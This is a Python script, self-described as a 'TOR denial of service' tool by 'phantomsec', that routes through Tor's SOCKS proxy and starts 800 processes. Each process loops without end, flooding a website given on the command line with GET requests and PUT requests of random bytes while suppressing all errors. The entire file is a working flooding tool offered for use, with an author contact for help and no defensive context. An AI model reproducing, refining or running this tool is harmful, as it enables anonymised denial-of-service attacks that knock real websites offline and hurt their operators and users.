import threading
import socks
import socket
import sys
import time
import os
from termcolor import colored
import random
import multiprocessing
import warnings
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9150)
socket.socket = socks.socksocket
import requests

if len(sys.argv)<2:
    print(colored(f"Usage: {sys.argv[0]} [WEBSITE]", "red"))
    sys.exit(1)
    
print(colored("TOR denial of service by phantomsec, contact me at phantomsec2@xmpp.jp on jabber for help. [can take up to a minute to start]", "magenta"))
target = sys.argv[1]
session = requests.session()
session.proxies = {'http':  'socks5h://localhost:9050',
                   'https': 'socks5h://localhost:9050'}

def main2(url):
  counter = 0
  while True:
      try:
        for i in range(1000000000000):
             b = session.get(url).text
             print(b)
             session.get(url)
             print(requests.get(url)).content
             random_bytes = random._urandom(1490)
             session.put(target, random_bytes)
             counter += 1
             print(counter)
      except Exception:
         pass

jobs = []
count = 0
for i in range(800):
    t1 = multiprocessing.Process(target=main2, args=(target,))
    count += 1
    jobs.append(t1)
    t1.start()
    
